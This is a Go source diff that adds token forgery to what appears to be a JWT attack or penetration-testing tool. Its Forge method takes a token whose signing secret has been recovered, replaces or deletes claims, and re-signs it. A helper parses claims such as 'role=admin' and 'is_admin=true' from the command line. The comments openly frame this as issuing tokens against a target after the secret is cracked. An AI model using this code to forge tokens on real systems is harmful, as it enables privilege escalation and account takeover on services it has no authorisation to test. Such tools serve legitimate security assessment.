@@ -198,3 +198,76 @@ func SignWith(algorithm, signingInput string, secret []byte) string {
 	signature := base64.RawURLEncoding.EncodeToString(signHMAC(algorithm, signingInput, secret))
 	return signingInput + "." + signature
 }
+
+// Forge returns a token this secret signs, with the named claims replaced.
+//
+// This is the last step of a discovery that started with a token in hand: once the secret is
+// known, the question stops being "can it be recovered" and becomes "what can be issued with
+// it". Overwriting a claim and signing the result answers that without the operator having to
+// reassemble a token by hand.
+//
+// The header is carried over rather than rebuilt, so the algorithm stays what the target
+// actually uses; replacing claims never touches it.
+func (t *Token) Forge(secret []byte, claims map[string]any) (string, error) {
+	header := make(map[string]any, len(t.Header))
+	for key, value := range t.Header {
+		header[key] = value
+	}
+	payload := make(map[string]any, len(t.Claims)+len(claims))
+	for key, value := range t.Claims {
+		payload[key] = value
+	}
+	for key, value := range claims {
+		if value == nil {
+			delete(payload, key)
+			continue
+		}
+		payload[key] = value
+	}
+
+	headerPart, err := encodeJWTPart(header)
+	if err != nil {
+		return "", err
+	}
+	payloadPart, err := encodeJWTPart(payload)
+	if err != nil {
+		return "", err
+	}
+	return SignWith(t.Algorithm(), headerPart+"."+payloadPart, secret), nil
+}
+
+// encodeJWTPart marshals one part the way the specification wants it: compact JSON, base64url,
+// no padding.
+func encodeJWTPart(object map[string]any) (string, error) {
+	raw, err := json.Marshal(object)
+	if err != nil {
+		return "", err
+	}
+	return base64.RawURLEncoding.EncodeToString(raw), nil
+}
+
+// ClaimFromValue reads a command-line claim the way a person writes one: a bare value is a
+// string, "true"/"false" and numbers are the types they look like, and a JSON document is
+// parsed as one. `role=admin` and `is_admin=true` both have to mean what they say.
+func ClaimFromValue(value string) any {
+	trimmed := strings.TrimSpace(value)
+	switch strings.ToLower(trimmed) {
+	case "true":
+		return true
+	case "false":
+		return false
+	case "null":
+		return nil
+	}
+	if len(trimmed) > 0 && (trimmed[0] == '{' || trimmed[0] == '[') {
+		var parsed any
+		if err := json.Unmarshal([]byte(trimmed), &parsed); err == nil {
+			return parsed
+		}
+	}
+	var number float64
+	if _, err := fmt.Sscanf(trimmed, "%g", &number); err == nil && fmt.Sprintf("%g", number) == trimmed {
+		return number
+	}
+	return value
+}
